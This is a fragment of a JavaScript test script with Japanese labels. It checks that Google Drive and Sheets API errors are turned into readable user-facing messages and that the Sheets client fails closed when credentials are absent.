console.log('⑩ 失敗の理由 (画面に出す文)');
ok(/コンテンツ管理者/.test(explainGoogleError(Object.assign(new Error('The caller does not have permission'), { code: 403 }))), '403 → サービスアカウントを共有ドライブに「コンテンツ管理者」以上で');
ok(/Sheets API/.test(explainGoogleError(Object.assign(new Error('Google Sheets API has not been used in project 123 before or it is disabled'), { code: 403 }))), 'API が無効 → Google Cloud で有効に');
ok(/見つかりません/.test(explainGoogleError(Object.assign(new Error('File not found'), { code: 404 }))), '404 → フォルダ・ファイルが見つからない');
ok(/繋がりませんでした/.test(explainGoogleError(new Error('timeout of 20000ms exceeded'))), '時間切れ');
ok(explainGoogleError(new Error('x'.repeat(1000))).length < 400, '長い失敗の文は切る');
ok(getSheetsWriteClients({}) === null, 'env が無ければクライアントは null (fail-closed)');

console.log(`\n${fail ? '❌' : '✅'} ${pass} 件成功 / ${fail} 件失敗`);
process.exit(fail ? 1 : 0);
